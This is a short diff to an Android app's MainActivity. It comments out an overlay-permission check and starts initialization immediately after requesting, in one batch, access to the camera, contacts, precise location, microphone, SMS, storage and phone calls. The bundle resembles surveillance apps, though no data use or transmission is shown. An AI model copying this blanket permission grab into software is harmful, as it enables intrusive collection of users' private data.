@@ -64,6 +64,7 @@ public class MainActivity extends AppCompatActivity {
 
 
 
+/*
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) { // WHAT IF THIS EVALUATES TO FALSE.
                 // if not construct intent to request permission
@@ -76,14 +77,15 @@ public class MainActivity extends AppCompatActivity {
 
                 initiliazation();
                 // Add code to bind and start the service directly.
-               /* try {
+                try {
                     Settings.canDrawOverlays(this);
                 }
                 catch(NoSuchMethodError e){
                     e.printStackTrace();
-                }*/
+                }
             }
         }
+*/
 
 
         try {
@@ -141,7 +143,8 @@ public class MainActivity extends AppCompatActivity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             requestPermissions(new String[]{android.Manifest.permission.CAMERA, android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.ACCESS_FINE_LOCATION, android.Manifest.permission.RECORD_AUDIO, android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.CALL_PHONE, android.Manifest.permission.CALL_PRIVILEGED}, 100);
         }
-        
+        initiliazation();
+
         /* initiliazation();*/
     }
 
